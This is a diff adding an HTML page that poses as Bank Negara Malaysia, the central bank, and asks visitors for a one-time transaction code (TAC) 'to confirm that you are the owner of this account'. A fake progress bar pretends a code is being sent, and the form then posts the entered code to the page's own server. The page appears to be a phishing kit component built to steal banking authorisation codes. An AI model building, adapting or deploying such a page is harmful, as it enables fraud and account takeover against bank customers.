@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Code</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+    <link rel="stylesheet" href="/static/bootstrap-4.5.0-dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/css/plaid.css">
+    <link rel="stylesheet" href="/static/css/maybank.css">
+    <script src="https://use.fontawesome.com/b630a46cc5.js"></script>
+</head>
+
+<body style="background-color: #0383e0">
+
+    <div class="container">
+        <section name='header'>
+            <div class="select-your-bank bnegara" style="text-align: center; color: white;">
+                <img src="/static/images/transparentLogo.png" width='40%' alt="">
+                <h5 style="margin: 0;">BANK NEGARA MALAYSIA</h5>
+                <a style="font-size: smaller;">CENTRAL BANK OF MALAYSIA</a>
+            </div>
+        </section>
+
+        <div class="headsup">
+            <p>To Confirm that you are the owner of this account, we will send a one time passcode to your phone number, Please click on request passcode when you are ready</p>
+        </div>
+        <button onclick="startMoving(), showForm()" id="btn-tac-request" class="tac-request btn btn-lg">Request TAC </button>
+
+        <div class="tac mt-5">
+            <div class="progress-bar">
+                <div id="progress">
+                
+                </div>
+            </div>
+            <p style="color: white;" id="another-tac-request" class="hide">
+                I didn't get the code <span style="color: wheat;" onclick="startMoving(), showForm()">
+                request another tac</span>
+            </p>
+            <div id="tac-form" class="hide-tac-form">
+                <form action="" method="POST">
+                    <p style="color: white;">Code sent please check your phone</p>
+                    <div class="form-group">
+                        <input name="tac" class="form-control" type="password" style="width: 100%; margin: 0;" placeholder="TAC">
+                        <small style="color: rgb(207, 204, 204);">do not reveal this code to anyone</small>
+                    </div>
+                    <button class="btn btn-lg"
+                        style="width: 100%; background-color: rgb(223, 223, 223); color: rgb(0, 102, 255);"
+                        type="submit">Confirm
+                    </button>
+    
+                </form>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+
+function startMoving(){
+    var progress = document.getElementById("progress");
+    var time = 100
+    var width = 0;
+    var id = setInterval(frame, 1000);
+    document.getElementById("btn-tac-request").style.display = "none"
+    progress.style.backgroundColor = "#3e70ef"
+    function frame(){
+        if (width == 100){
+            clearInterval(id);
+            document.getElementById("another-tac-request").classList.remove("hide");
+        }else{
+            width++;
+            time --;
+            if(width > 50 && width < 70 ){
+                progress.style.backgroundColor = "#efbf3e";
+            }else if(width > 70){
+                progress.style.backgroundColor = "red";
+            }
+            progress.style.width = width + '%';
+            progress.innerHTML = width;
+        }
+    }
+}
+
+
+function showForm(){
+    document.getElementById("tac-form").classList.remove("hide-tac-form");
+    document.getElementById("tac-form").classList.add("show-tac-form");
+    document.getElementById("another-tac-request").classList.add("hide")
+}
+    </script>
+
+</body>
+
+</html>
